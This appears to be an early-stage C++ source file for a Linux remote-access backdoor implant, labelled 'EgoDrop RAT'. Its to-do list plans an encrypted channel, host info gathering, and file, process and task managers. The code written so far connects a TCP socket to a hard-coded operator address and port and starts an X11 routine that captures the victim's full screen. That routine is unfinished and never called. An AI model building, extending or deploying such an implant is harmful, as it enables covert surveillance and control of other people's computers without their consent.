/*
///---------------[ README ]---------------\\\

Name: EgoDrop RAT backdoor client(Implant).
Author: ISSAC

Todo:
Establish TCP socket connection.
Establish encrypted TCP channel.
Send info.
Test ping.
FileMgr.
ProcMgr.
TaskMgr.

Done:


///---------------[ README ]---------------\\\
*/

///---------------[ Library ]---------------\\\

#include <iostream>
#include <cstring>
#include <string>
#include <unistd.h>

//Socket
#include <arpa/inet.h>

//Screenshot
#include <X11/Xlib.h>
#include <X11/Xutil.h>

///---------------[ Library ]---------------\\\

#define g_szIP "127.0.0.1"
#define g_nPort 4444

using namespace std;

#pragma region Logs Tool

void fnLogOK(const string& szMsg)
{
    cout << "[+] " << szMsg << endl;
}
void fnLogInfo(const string& szMsg)
{
    cout << "[*] " << szMsg << endl;
}
void fnLogError(const string& szMsg)
{
    cerr << "[-] " << szMsg << endl;
}

#pragma endregion
#pragma region Debug Tool



#pragma endregion


int main()
{
    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    if (sktSrv < 0)
    {
        fnLogError("Socket creation failed.");
        return 1;
    }

    sockaddr_in srvAddr{};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(g_nPort);
    if (inet_pton(AF_INET, g_szIP, &srvAddr.sin_addr) <= 0)
    {
        fnLogError("Invalid IPv4 address.");
        return 1;
    }

    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {
        char acStr[100];
        snprintf(acStr, sizeof(acStr) - 1, "Failed to connect to %s:%d", g_szIP, g_nPort);
        fnLogError(acStr);
    }

    return 0;
}

void fnScreenshot()
{
    Display *display = XOpenDisplay(NULL);
    if (!display)
    {
        fnLogError("Failed to open display.");
        return;
    }

    Window root = DefaultRootWindow(display);
    XImage *img = XGetImage(display, root, 0, 0, 1920, 1080, AllPlanes, ZPixmap);


}